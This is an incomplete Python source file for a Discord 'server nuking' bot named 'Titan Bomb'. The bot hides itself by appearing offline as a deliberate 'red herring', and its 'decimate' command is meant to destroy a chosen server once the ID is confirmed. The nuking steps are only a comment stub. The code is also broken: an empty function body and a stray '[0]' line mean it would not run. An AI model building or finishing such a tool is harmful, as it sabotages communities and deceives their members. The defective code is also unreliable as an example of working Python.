# Titan Bomb
# A smarter Discord server nuking bot
# NOTE: USE ONLY IN EMERGENCEIS

import discord # module to interact with Discord
from discord.ext import commands # extension library for bot commands
import asyncio # library for asynchronous functions 

prefix = "-"
bot = commands.Bot(command_prefix=prefix) # creates a bot and makes it prefix the set string
bot.remove_command("help")

@bot.event
async def on_ready(): # when the bot is initialized and ready to do stuff
    await bot.change_presence(status=discord.Status.invisible) # red herring to make people think the bot is down
    print("Ready")

@bot.command()
async def help(ctx):


@bot.command()
async def decimate(ctx, serverid):
    
    # Error codes:
    # 0: bot is not in server that has the ID specified, or the server does not exist

    if ctx.channel.type != discord.ChannelType.private:
        return
    
    await ctx.send("Confirm by re-entering the server ID.")
    try:
        message = await bot.wait_for("message", check=lambda m: m.channel.id == ctx.channel.id and m.content.lower().strip().lstrip() == serverid, timeout=15.0) # confirms the server by having the user retype the server ID
    except asyncio.TimeoutError:
        return
    servers = [s for s in bot.user.guilds if s.id == int(serverid)]
    
    
    if len(servers) == 0:
        return await ctx.send("0")
    [0]

    
    # Step 1 of the smart nuking process: prevent people from creating invites








token = "" # bot token required to use Discord's API
bot.run(token) # starts the program